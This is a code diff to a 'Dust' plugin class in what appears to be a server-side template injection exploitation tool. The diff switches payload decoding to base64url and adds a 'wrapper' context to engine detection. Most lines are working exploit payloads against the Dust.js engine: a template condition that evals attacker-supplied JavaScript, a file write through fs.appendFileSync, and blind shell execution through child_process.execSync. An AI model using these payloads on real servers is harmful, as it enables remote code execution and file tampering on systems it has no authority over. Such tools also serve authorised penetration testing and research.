@@ -9,11 +9,11 @@ class Dust(javascript.Javascript):
         self.update_actions({
             'evaluate': {
                 'call': 'inject',
-                'evaluate': """{{@if cond=\"eval(Buffer('{code_b64}', 'base64').toString())\"}}{{/if}}"""
+                'evaluate': """{{@if cond=\"eval(Buffer('{code_b64}', 'base64url').toString())\"}}{{/if}}"""
             },
             'write': {
                 'call': 'evaluate',
-                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64'), 'binary')""",
+                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64url'), 'binary')""",
                 'truncate': """require('fs').writeFileSync('{path}', '')"""
             },
             # Not using execute here since it's rendered and requires set headers and trailers
@@ -21,7 +21,7 @@ class Dust(javascript.Javascript):
                 'call': 'evaluate',
                 # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                 # TODO: use another function.
-                'execute_blind': """require('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}');""",
+                'execute_blind': """require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}');""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             }
@@ -41,18 +41,19 @@ class Dust(javascript.Javascript):
     def _detect_dust(self):
         # Print what it's going to be tested
         log.log(23, f'{self.plugin} plugin is testing rendering')
-        for prefix, suffix in self._generate_contexts():
+        for prefix, suffix, wrapper in self._generate_contexts():
             payload = 'AA{{!c!}}AA'
             header_rand = rand.randint_n(10)
             header = str(header_rand)
             trailer_rand = rand.randint_n(10)
             trailer = str(trailer_rand)
             if 'AAAA' == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
-                                     trailer_rand=trailer_rand, prefix=prefix, suffix=suffix):
-                self.set('header', '{}')
-                self.set('trailer', '{}')
+                                     trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper):
+                self.set('header', '{header}')
+                self.set('trailer', '{trailer}')
                 self.set('prefix', prefix)
                 self.set('suffix', suffix)
+                self.set('wrapper', wrapper)
                 self.set('engine', self.plugin.lower())
                 self.set('language', self.language)
                 return
